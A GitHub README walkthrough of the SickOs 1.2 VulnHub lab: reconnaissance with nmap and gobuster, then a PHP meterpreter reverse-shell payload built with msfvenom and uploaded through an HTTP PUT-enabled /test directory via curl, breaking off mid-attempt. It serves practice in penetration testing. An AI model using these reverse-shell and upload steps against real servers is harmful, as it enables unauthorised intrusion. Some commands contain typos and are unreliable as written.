# SickOs1.2
this repo is based on [SickOS](https://www.vulnhub.com/entry/sickos-12,144/). 

# Setup 
I am using VMware. The creator of SickOS claims that there is trouble with VMbox. Kali Linux is the OS I am using for penetration. 

# Reconnaissance 
THe first step is to use the command ``` netdiscover -i eth0 ``` to pull the IP. Below is what is shown, we have the IP.

```
192.168.1.142   00:0c:29:10:88:6e      2     120  VMware, Inc. 
```
Typing in that ip in the browser, the website shows 

<img width="1192" alt="Screen Shot 2021-04-22 at 12 31 52 PM" src="https://user-images.githubusercontent.com/81980702/115762191-d0351c80-a368-11eb-91f3-2a7778ae2b10.png">

Viewing the page source, this is what is shown below. Not much more information than a meme. Is it true? We will never know.  
```
<html>

<img src="blow.jpg">

</html>

<!-- NOTHING IN HERE ///\\\ -->>>>
````
Running ``` nmap -A -T4 -p- 192.168.1.142 ```, I get this text below. 
> ***Breakdown of flags***
>-A = Enables OS detection, version detection, script scanning, and trace route 
>-T4 = Sets timmimg template 
>-p = port range  

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 12:57 CDT
Nmap scan report for ubuntu.lan (192.168.1.142)
Host is up (0.0019s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:10:88:6E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
```
We can gather alot of information about the nmap scan. We can see 22 and 80 tcp ports open. we can also see that it is running ``openssh 5.9 p1 Debian`` and ``lightpd 1.4.28``

# Gobuster Brute Attack for directories 

Using ```gobuster dir --url http://192.168.1.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ```, You can find the directories of the website. Here is what it returned below.

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.142
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/22 13:21:52 Starting gobuster in directory enumeration mode
===============================================================
/test                 (Status: 301) [Size: 0] [--> http://192.168.1.142/test/]
/%7Echeckout%7E       (Status: 403) [Size: 345]                               
                                                                              
===============================================================
2021/04/22 13:23:05 Finished
===============================================================
```
Looks like the directory that gobuster found was ```/test``` and ```/%7Echeckout%7E```. We can access the directory by typing it in the search bar such as ``192.168.1.142/test``
> <img width="386" alt="Screen Shot 2021-04-22 at 8 59 57 PM" src="https://user-images.githubusercontent.com/81980702/115807226-d699b780-a3ad-11eb-8c69-98e43808be09.png">


# Finding Explouts 
Through our reconnaissance, we can tell that the server is running ```OpenSSH 5.9p1```. Running command ```searchsploit openSSH 5.9p1```. We can see this below 
```
-------------------------------------------------------------- ---------------------------------
 Exploit Title                                                |  Path
-------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                  | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                        | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded U | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading      | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                          | linux/remote/45939.py
-------------------------------------------------------------- ---------------------------------
```
using ``` ls -al /usr/share/nmap/scripts/ | grep -e "http-" ``` 
>**Breakdown** 
>-al = all with author. 
>-e = extend pattern. 

We want to use these scripts below. 

```
`-rw-r--r-- 1 root root 20667 Oct 12  2020 http-enum.nse
-rw-r--r-- 1 root root  7320 Oct 12  2020 http-methods.nse
```
Running ``` nmap sV -p 80 192.168.1.142 --script http-enum ```, I can see that the only directory is /test
```
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /test/: Test page
MAC Address: 00:0C:29:10:88:6E (VMware)
```
Running ``` nmap sV -p 80 192.168.1.142 --script http-methods ```, We can see the method supported is. Get Head Post Options
```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:10:88:6E (VMware)
```
Running ``` nmap sV -p 80 192.168.1.142 --script http-methods --script-args http-methods.url-path='/test' ```

```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test
MAC Address: 00:0C:29:10:88:6E (VMware)
```
# Creating the payload
Running command ```msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=1234 -f raw > shell.php``` The payload gets set 

# Metasploit

using command ```msfconsole```, metasploit is brought up. Put the commands in the order shown below.

```
use exploit/multi/handle 
set payload php/meterpreter_reverse_tcp
set LHOST 192.168.1.200
set LPORT 1234
```
Upload the payload onto 192.168.1.142 with the command below.
```
curl -T shell.php http://192.168.1.142/test/shell.php --http1.0
```
<img width="515" alt="Screen Shot 2021-04-22 at 10 03 17 PM" src="https://user-images.githubusercontent.com/81980702/115812205-a0ad0100-a3b6-11eb-864b-e556149f86f0.png">

# Possible firewall with port 1234
When the handle is clicked, there seems to be an error because ``/`` us returned.

Set the newpayload with the correct port below. 
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=443 -f raw > shell.php
```
Naming it reverse.php so we can distiguish it with ``payload.php``
```
curl -T shell.php http://192.168.1.142/test/reverse.php

